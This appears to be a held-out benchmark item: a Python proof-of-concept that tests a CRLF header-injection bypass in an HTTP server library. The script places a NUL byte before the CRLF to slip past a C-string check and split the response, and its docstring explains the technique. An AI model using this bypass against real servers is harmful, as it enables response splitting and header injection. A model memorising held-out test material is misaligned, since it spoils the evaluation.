#!/usr/bin/env python3
"""HELD-OUT bypass PoC for CVE-2025-0825 (incomplete fix of CVE-2020-11709).

Residual payload: a NUL byte (%00) is placed BEFORE the CRLF in the reflected
"x" param. At V1 (v0.18.3) Response::set_header validates with
detail::has_crlf(val), which walks val.c_str() and stops at the first NUL --
so the CRLF after the NUL is never seen and the header is emplaced verbatim,
splitting the response and injecting X-Pcb-Inject: <PCB_FLAG>.

V2 (v0.18.4) replaces has_crlf with detail::fields::is_field_value(), a
length-based RFC field-content check that inspects every byte including those
after the NUL, so the residual is rejected and the bypass is closed.

Usage: python3 bypass_poc.py <host> <port>   (defaults 127.0.0.1 18081 = V1)
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from oracle import send_raw, build_query, injected  # noqa: E402

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 18081

raw = send_raw(host, port, build_query("residual"))
ok = injected(raw)
print(f"[residual/NUL-prefixed-CRLF] target={host}:{port} injected_marker={ok}")
print("----- raw response header block -----")
sys.stdout.write(raw.split(b"\r\n\r\n", 1)[0].decode("latin-1", "replace"))
print()
sys.exit(0 if ok else 1)
